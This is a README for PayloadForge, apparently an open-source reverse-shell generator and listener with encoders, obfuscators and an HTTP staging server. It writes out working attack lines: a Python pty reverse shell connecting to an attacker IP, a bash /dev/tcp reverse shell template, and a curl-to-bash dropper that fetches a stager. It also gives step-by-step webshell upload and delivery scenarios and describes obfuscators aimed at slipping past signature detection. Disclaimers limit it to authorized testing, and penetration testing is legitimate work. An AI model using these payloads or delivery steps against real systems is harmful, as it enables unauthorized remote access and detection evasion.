<p align="center">
<img width="780" height="704" alt="1" src="https://github.com/user-attachments/assets/5386e57c-44c9-446c-b9f5-df28ec12a618" />
</p>

<h1 align="center">PayloadForge</h1>

<p align="center">
  <strong>Reverse shell generator and listener — by DEDSEC.</strong><br>
  <em>Craft. Obfuscate. Deliver.</em>
</p>

<p align="center">
  <a href="LICENSE"><img alt="License: AGPL-3.0" src="https://img.shields.io/badge/license-AGPL--3.0-ff0a54?style=for-the-badge&labelColor=0a0004"></a>
  <a href="https://github.com/Unknownx007/payloadforge/releases"><img alt="Version" src="https://img.shields.io/badge/version-v0.1.0-00ff41?style=for-the-badge&labelColor=0a0004"></a>
  <a href="https://www.python.org/downloads/"><img alt="Python" src="https://img.shields.io/badge/python-3.10+-00e5ff?style=for-the-badge&labelColor=0a0004"></a>
  <a href="https://github.com/Unknownx007/payloadforge/actions/workflows/windows-test.yml"><img alt="Windows CI" src="https://img.shields.io/badge/windows%20ci-passing-00ff41?style=for-the-badge&labelColor=0a0004"></a>
  <a href="#verified-scope"><img alt="Local verification" src="https://img.shields.io/badge/local%20verify-22%2F22-00e5ff?style=for-the-badge&labelColor=0a0004"></a>
  <a href="#legal-disclaimer"><img alt="Authorized use only" src="https://img.shields.io/badge/use-authorized%20only-ff0033?style=for-the-badge&labelColor=0a0004"></a>
</p>

<p align="center">
  <code>Linux</code> · <code>macOS</code> · <code>Windows</code> · <code>14 Linux payloads</code> · <code>6 Windows payloads</code> · <code>7 encoders</code> · <code>9 obfuscators</code> · <code>TCP + TLS listeners</code>
</p>

---

## ⚠️ Legal disclaimer

> **PayloadForge is intended for authorized security testing and educational purposes only.**

You must use it exclusively against systems you own or have **explicit written permission** to test. Unauthorized access to computer systems is a criminal offense under the **Computer Fraud and Abuse Act (US)**, the **Computer Misuse Act (UK)**, and equivalent laws in nearly every country.

The author (**DEDSEC**) assumes no liability for misuse or damage caused by this tool. You are solely responsible for how you use it.

**If you do not have written authorization, do not run this.**

---

## Table of contents

- [What this is](#what-this-is)
- [What this is not](#what-this-is-not)
- [Features](#features)
- [Install](#install)
- [Pre-install requirements](#pre-install-requirements)
- [Quick start](#quick-start)
- [Command reference](#command-reference)
- [Payload categories](#payload-categories)
- [Delivery scenarios](#delivery-scenarios)
- [HTTP staging for droppers](#http-staging-for-droppers)
- [Listener modes](#listener-modes)
- [Encoders and obfuscators](#encoders-and-obfuscators)
- [Verified scope](#verified-scope)
- [Troubleshooting](#troubleshooting)
- [Adding your own payloads](#adding-your-own-payloads)
- [Contributing](#contributing)
- [Security policy](#security-policy)
- [License](#license)
- [Credits](#credits)

---

## What this is

- **Payload generator** — reverse shell one-liners in 12+ languages.
- **Listener** — TCP or TLS, with line-buffered or raw interactive input.
- **Staging server** — HTTP host for second-stage droppers.
- **Payload validator** — `verify` and `testall` prove every locally-testable feature end-to-end.
- **Library** — inspectable, modifiable, extensible templates.

## What this is not

- **Not an exploitation framework.** No scanning, no exploits. You must already have a way to run code on the target.
- **Not an AV/EDR bypass tool.** Obfuscators raise the cost of naive signature matching. They are not a silver bullet.
- **Not a C2.** One-shot payloads. No beaconing, persistence, lateral movement, or session management.

## Features

<table>
<tr><td width="50%">

**Payloads**
- 14 Linux reverse shells
- 6 Windows payloads
- 11 cloud payloads (AWS + K8s)
- 9 web payloads (JSP / PHP / ASPX)
- 6 tunnel payloads (SSH / chisel / socat)
- 6 chain droppers

</td><td width="50%">

**Tooling**
- 7 encoders
- 9 obfuscators
- TCP listener (line + raw modes)
- TLS listener (auto cert)
- HTTP payload server
- `verify` + `testall` + `checkdeps`
- GitHub Actions Windows CI

</td></tr>
</table>

---

## Install

### From source (recommended)

```bash
git clone https://github.com/Unknownx007/payloadforge
cd payloadforge
python -m venv .venv
source .venv/bin/activate          # Linux / macOS
# .venv\Scripts\activate           # Windows PowerShell

pip install -e .
```

Requires **Python 3.10+**. Three runtime dependencies (`rich`, `prompt_toolkit`, `pyperclip`) are installed automatically.

### Run

```bash
payloadforge
```

You'll see the DEDSEC skull banner, then:

```
[DEDSEC@pf]~[127.0.0.1:4444] $
```

### Verify the install

```bash
payloadforge
[DEDSEC@pf]~[127.0.0.1:4444] $ verify
```

Everything testable locally runs and reports PASS / FAIL in under a minute.

---

## Pre-install requirements

PayloadForge itself needs only Python. The **payloads you generate** need a matching interpreter on the target.

### Target-side interpreters

| Payload language | Linux / macOS | Windows |
|---|---|---|
| `bash` | bash (present) | — |
| `python` | python3 (usually present) | — |
| `perl` | perl (usually present) | — |
| `ruby` | ruby | — |
| `php` | php-cli | — |
| `node` | node | — |
| `socat` | socat | — |
| `nc` | netcat-openbsd **or** nmap-ncat | — |
| `awk` | gawk or mawk | — |
| `powershell` | — | PowerShell 2.0+ (present) |
| `cmd` | — | cmd.exe (present) |
| `mshta` | — | mshta.exe (present) |

### Local interpreter installs (for `verify` / `testall`)

**Arch:**

```bash
sudo pacman -S python php ruby socat openbsd-netcat gawk nodejs perl
```

**Debian / Ubuntu:**

```bash
sudo apt install python3 php-cli ruby socat netcat-openbsd gawk nodejs perl
```

**Fedora:**

```bash
sudo dnf install python3 php-cli ruby socat nmap-ncat gawk nodejs perl
```

**macOS (Homebrew):**

```bash
brew install python php ruby socat netcat gawk node perl
```

Missing interpreters cause `verify` / `testall` to show `SKIP`, not `FAIL`.

### Optional: PowerShell Core on Linux

Enables local syntax testing of Windows payloads:

```bash
sudo pacman -S powershell         # Arch
brew install --cask powershell    # macOS
```

`pwsh` on Linux is PowerShell Core (.NET Core), not Windows PowerShell 5.1. It catches syntax and logic bugs; not a substitute for real Windows.

### Optional: `openssl` (for the TLS listener)

```bash
sudo pacman -S openssl       # usually already installed
```

---

## Quick start

```bash
payloadforge
```

### 1. Set your listener address

```
[DEDSEC@pf]~[127.0.0.1:4444] $ set lhost 192.168.1.42
[+] lhost = 192.168.1.42
[DEDSEC@pf]~[192.168.1.42:4444] $ set lport 5555
[+] lport = 5555
```

`lhost` is **your** IP — where the target connects back to.

### 2. Browse the catalog

```
[DEDSEC@pf]~[192.168.1.42:5555] $ categories
[DEDSEC@pf]~[192.168.1.42:5555] $ list linux
[DEDSEC@pf]~[192.168.1.42:5555] $ info python3_pty
```

### 3. Generate a payload

```
[DEDSEC@pf]~[192.168.1.42:5555] $ generate python3_pty
```

Output:

```
════════════════════════════════════════════════════════════
python3 -c 'import socket,pty,os;s=socket.socket();s.connect(("192.168.1.42",5555));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
════════════════════════════════════════════════════════════
```

### 4. Start a listener

In one terminal:

```
[DEDSEC@pf]~[192.168.1.42:5555] $ listen
```

### 5. Deliver to the target

On the target — which you have **written authorization** to test — run the generated payload. The shell connects back and you're in.

---

## Command reference

| Command | Description |
|---|---|
| `help [cmd]` | Show commands, or help for one |
| `set <key> <value>` | Set `lhost`, `lport`, `http_port`, `encoder`, `obfuscators`, `tls` |
| `show` | Show current options |
| `categories` | List payload categories and counts |
| `list [cat]` | List payloads (optionally in one category) |
| `info <payload>` | Show full details for a payload |
| `generate <payload> [-o file] [-c]` | Generate a payload (`-o` writes to file, `-c` copies to clipboard) |
| `encoders` | List available encoders |
| `obfuscators` | List available obfuscators |
| `serve [docroot]` | Start the HTTP payload server |
| `listen [tls\|raw]` | Start the listener (see [Listener modes](#listener-modes)) |
| `test <payload>` | Test one testable payload against `127.0.0.1` |
| `testall [cat]` | Test every testable payload |
| `checkdeps` | Show which interpreters are installed |
| `verify` | Full end-to-end verification |
| `clear` / `exit` | Clear screen / quit |

---

## Payload categories

| Category | Count | Description |
|---|---|---|
| `linux` | 14 | Reverse shells for Linux / macOS |
| `windows` | 6 | Reverse shells and droppers for Windows |
| `cloud` | 11 | AWS IMDS, S3, SSM, Kubernetes |
| `web` | 9 | JSP, PHP, ASPX — shells and webshells |
| `tunnel` | 6 | SSH pivots, SOCKS proxies, chisel |
| `chain` | 6 | HTTP droppers for staged delivery |

### Best Linux payloads

- **`python3_pty`** — fully interactive TTY. Arrow keys, tab, Ctrl+C, `sudo`, `su`, `ssh`, `vim` all work. **Use with `listen raw`.**
- **`socat`** — same, if socat is installed. **Use with `listen raw`.**
- **`bash_tcp`** — smallest, most compatible, no TTY. Use with `listen`.

### Best Windows payloads

- **`powershell_tcp`** — vanilla PowerShell, one-liner. Works on any Windows since 7. Use with `listen`.
- **`cmd_powershell`** — same, launched via cmd.exe. No `%` characters, survives `.bat` files.
- **`powershell_encoded`** — generate with `set encoder utf16le_b64`, wrap in `powershell -e <b64>`.

---

## Delivery scenarios

> Every example assumes **written authorization** to run code on the target. PayloadForge does not find a foothold — it takes over once you have one.

### Scenario A — you already have a low-privilege shell

You have a shell on a Linux host and want a full interactive TTY:

1. On your machine: `set lhost <your-ip>`, `set lport 5555`
2. `listen raw`
3. On the target, through your existing shell: paste `generate python3_pty` output
4. Full interactive TTY. Press `Ctrl+]` to disconnect.

### Scenario B — Windows via cmd.exe

1. `set lhost <your-ip>`, `set lport 5555`
2. `listen`
3. On the target at a cmd.exe prompt: paste `generate cmd_powershell` output
4. PowerShell session comes back. Type commands line-by-line.

### Scenario C — dropper (short initial command)

When the initial injection point has a character limit:

1. `set lhost <your-ip>`, `set lport 5555`, `set http_port 8080`
2. Build the stager: `generate python3_pty -o ~/pf-http/stager.sh`
3. `serve ~/pf-http` (terminal 1)
4. `listen raw` (terminal 2)
5. On the target, run: `generate chain_bash_curl` output
6. The stager downloads over HTTP and connects back.

### Scenario D — through a webshell

Write access to a web root:

1. `generate php_cmd_shell` (or `jsp_cmd_shell`, `aspx_cmd_shell`)
2. Upload the file
3. Visit `https://target/uploads/shell.php?c=id`
4. For an interactive session: `generate php_reverse`, upload, `listen`, request the file.

### Scenario E — reverse shell through a public IP

Your laptop is behind NAT:

- **Port-forward** on your router: forward `lport` TCP to your laptop, use your public IP as `lhost`
- **VPS**: run PayloadForge on a cheap VPS with a public IP, use that as `lhost`

### What this tool does not do for you

- **Finding the initial foothold.** Getting there is out of scope.
- **AV / EDR bypass.** Payloads are vanilla — signatures may detect them.
- **Persistence, lateral movement, C2.** PayloadForge is one-shot.

---

## HTTP staging for droppers

Chain payloads fetch a second stage over HTTP.

### 1. Prepare the docroot

```bash
mkdir -p ~/pf-http
```

### 2. Generate the stager into it

```
[DEDSEC@pf]~[192.168.1.42:5555] $ generate python3_pty -o ~/pf-http/stager.sh
```

### 3. Start the HTTP server

```
[DEDSEC@pf]~[192.168.1.42:5555] $ set http_port 8080
[DEDSEC@pf]~[192.168.1.42:5555] $ serve ~/pf-http
```

Verify with:

```bash
curl http://192.168.1.42:8080/stager.sh
```

### 4. Start the listener in another terminal

```
[DEDSEC@pf]~[192.168.1.42:5555] $ listen raw
```

### 5. Generate and deliver the chain payload

```
[DEDSEC@pf]~[192.168.1.42:5555] $ generate chain_bash_curl
```

```
curl -s http://192.168.1.42:8080/stager.sh | bash
```

Deliver that to the target. It fetches the stager and you get a shell.

**Note:** generate the stager *after* setting lhost / lport / http_port. Don't change them between generating the stager and running the chain.

---

## Listener modes

`listen` supports two input modes because not all reverse shells behave the same way.

| Mode | Command | Use with | Behaviour |
|---|---|---|---|
| **line** (default) | `listen` | bash, PowerShell, cmd, python, perl, php, node, nc | You type a full command, press Enter, the line goes out. Works with any non-PTY shell. |
| **raw** | `listen raw` | `python3_pty`, `socat` | Every keystroke forwards immediately. Required for PTY-backed shells — lets you use `sudo`, `vim`, `ssh`, password prompts. Exit with `Ctrl+]`. |
| **TLS** | `listen tls` | any TLS-capable payload | TLS socket with auto-generated self-signed cert. Line mode. |

**Why two modes exist:** a non-PTY shell (PowerShell, bash, cmd) reads input line-by-line. If you send one byte at a time, it treats each byte as a full command, executes nothing, and prints a new prompt. Raw mode causes exactly that loop. Line mode is correct for those shells.

A PTY-backed shell (`python3_pty`, `socat`) reads character-by-character. Line mode would still work but you'd lose the TTY features — `sudo` prompts, arrow keys, tab completion. Raw mode is correct for those.

---

## Encoders and obfuscators

### Encoders

| Name | Purpose |
|---|---|
| `base64` | Standard base64 |
| `base64_nl` | Base64, newline-stripped |
| `utf16le_b64` | UTF-16LE + base64 — what PowerShell `-EncodedCommand` expects |
| `hex` | `\x`-prefixed hex |
| `url` | URL percent-encoding |
| `gzip_b64` | Gzip then base64 |
| `rev` | Reversed string |

Usage: `set encoder utf16le_b64` then `generate powershell_tcp`.

### Obfuscators

| Name | Target | What it does |
|---|---|---|
| `vars_bash` | bash | Renames `$VARIABLES` to random names |
| `vars_python` | python | Renames single-letter vars, skips quoted text and CLI flags |
| `split_strings_bash` | bash | Splits `"string"` into `"str""ing"` |
| `split_strings_python` | python | Splits into `("str" "ing")` |
| `split_strings_ps` | powershell | Replaces `.` in strings and reconstructs via `.Replace()` |
| `ps_case_flip` | powershell | Randomizes cmdlet case |
| `ps_backticks` | powershell | Inserts backticks in cmdlet names |
| `ps_concat_chain` | powershell | Combines split + case flip |
| `double_b64` | any | Base64 twice |

Chain them: `set obfuscators split_strings_ps,ps_case_flip`

**Honest limitation:** obfuscators raise the cost of naive signature matching. They do not defeat a modern AV engine or a human analyst reading the payload.

---

## Verified scope

Every feature that can be tested on a single Linux machine has been tested end-to-end. Results are reproducible with `verify` and `testall`.

| Feature | Result |
|---|---|
| **14 Linux reverse shells** | ✅ 14/14 on Arch Linux, Python 3.14 |
| **7 encoders** | ✅ 7/7 end-to-end |
| **9 obfuscators** | ✅ 9/9 end-to-end |
| **TLS listener** | ✅ Real TLS handshake |
| **4 chain droppers** | ✅ 4/4 with live HTTP server |
| **PHP webshell** | ✅ Against `php -S` |
| **Windows `powershell_tcp`** | ✅ On GitHub Actions Windows Server 2022 |
| **Windows `cmd_powershell`** | ✅ On GitHub Actions Windows Server 2022 |

### Templates, not yet verified against live targets

Correct templates — the code runs — but not tested against real infrastructure:

- **`cloud`** — AWS IMDS, S3, SSM, K8s. Requires real EC2 / K8s.
- **`tunnel`** — SSH reverse, SOCKS, port-forward, chisel. Requires a real SSH server.
- **`web` JSP / ASPX** — Requires Tomcat or IIS.
- **`windows` mshta, certutil, IEX** — Require real Windows; can be added to CI matrix.
- **`chain` powershell / certutil** — Require real Windows + running HTTP server.

### Reproduce

```bash
payloadforge
[DEDSEC@pf]~[127.0.0.1:4444] $ verify
[DEDSEC@pf]~[127.0.0.1:4444] $ testall
[DEDSEC@pf]~[127.0.0.1:4444] $ checkdeps
```

Windows CI runs on every push to `main`. See `.github/workflows/windows-test.yml`.

---

## Troubleshooting

### Listener keeps reprinting the prompt on every keypress

You're in **raw mode** against a **non-PTY shell**. Exit (`Ctrl+]`) and restart with `listen` (line mode) instead of `listen raw`. See [Listener modes](#listener-modes).

### Payload connects but you get no shell prompt

The interpreter may be buffering. Try `python3_pty` or `socat` (both allocate a PTY) with `listen raw`.

### Payload doesn't connect at all

- Check the listener's firewall.
- From the target: `ping <lhost>`.
- If the target is behind NAT, `lhost` must be your public IP or a VPS.

### `testall` shows SKIP for a language

Interpreter isn't installed. See [Pre-install requirements](#pre-install-requirements). SKIP is not a failure.

### `verify` shows FAIL for an encoder / obfuscator

Run `checkdeps` first. Some tests target PowerShell and need `pwsh`. If a specific test fails with `pwsh` installed, the payload hit a parsing quirk of your `pwsh` version — paste the failure in an issue.

### TLS listener handshake fails

`openssl` must be in your `PATH`.

### Generated payload has `[something]` missing when I paste it

You're not on v0.1.0's fix. Update: `git pull`. In v0.1.0 and later, `generate` prints payloads with `markup=False`, so `[text.encoding]`, `[byte[]]`, `[Convert]`, and every other `[...]` literal reaches the paste buffer intact.

### Windows payload authoring

Avoid `%` in Windows templates. In a `.bat` context, cmd.exe interprets `%` as a variable reference and corrupts the payload before PowerShell sees it. Use `ForEach-Object` instead of `%`, and `$env:TEMP` instead of `%TEMP%`.

### Windows payload fails on CI runner

The workflow sets `DOTNET_SYSTEM_NET_DISABLEIPV6=1` to force .NET into IPv4 mode. PowerShell's `TCPClient` on Windows Server resolves `127.0.0.1` to `[::ffff:127.0.0.1]`, and a listener bound only to `127.0.0.1` will not accept those. The dual-stack listener in `payloadforge/listener/test_server.py` binds IPv4 and IPv6 to be safe.

---

## Adding your own payloads

1. Pick or create a module in `payloadforge/payloads/`
2. Register the payload:

```python
from payloadforge.payloads.registry import register

register(
    "my_shell",
    "linux", "bash",
    "bash -c 'exec 5<>/dev/tcp/{lhost}/{lport}; cat <&5 | while read line; do $line 2>&5 >&5; done'",
    "My custom reverse shell.",
    tags=["tcp", "custom"],
)
```

3. Placeholders: `{lhost}`, `{lport}`, `{http_port}`
4. Set `testable=True` if it runs against `127.0.0.1` on Linux, otherwise `testable=False` with a `test_note`
5. Import your module in `payloadforge/payloads/__init__.py`

### Adding an obfuscator

```python
@register_obfuscator("my_obf", "What it does.")
def obf_my(data: str) -> str:
    return data.replace(...)
```

Then add it to `_OBF_TARGETS` in `payloadforge/commands/verify.py` so `verify` proves it works.

---

## Contributing

Before opening a PR:

1. Fork, create a feature branch
2. Add your payload / encoder / obfuscator
3. Update `payloadforge/commands/verify.py` if the new feature is locally testable
4. Run `verify` and `testall` — every row that was PASS must still be PASS
5. Update `CHANGELOG.md` under `## [Unreleased]`
6. Open the PR with a short description and the `verify` output

### Style

- Keep it simple, keep it honest.
- No obfuscation of the source itself.
- No payload that targets systems without explicit authorization.
- No AV-evasion claims that cannot be backed up with a working PoC.

---

## Security policy

### Reporting a vulnerability in PayloadForge

Open a **private** security advisory on GitHub (`Security` tab → `Report a vulnerability`). Do not open a public issue.

### On misuse

PayloadForge is dual-use. Misuse is not the maintainer's responsibility and will not be supported. The tool displays a mandatory disclaimer at startup. Forks that remove it are the fork author's concern.

### On attribution

AGPL-3.0 requires that the original author credit **DEDSEC** be preserved in any copy, fork, or derivative work. If you find a fork that has stripped the credit, open an issue with a link. Legal notices will be filed where appropriate.

---

## License

**AGPL-3.0-or-later.** See [LICENSE](LICENSE) and [NOTICE](NOTICE) for the full text and attribution requirements.

```
PayloadForge
Copyright (C) 2025 DEDSEC

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as published
by the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU Affero General Public License for more details.
```

Under Section 5 of the AGPL, the original author credit **DEDSEC** must be preserved in any copy, fork, or derivative work.

---

## Credits

**Built by DEDSEC.**

If you use PayloadForge in a talk, write-up, or course, credit the original repo:

`https://github.com/Unknownx007/payloadforge`

<p align="center">
  <sub>PayloadForge v0.1.0 · AGPL-3.0-or-later · for authorized security testing only</sub>
</p>
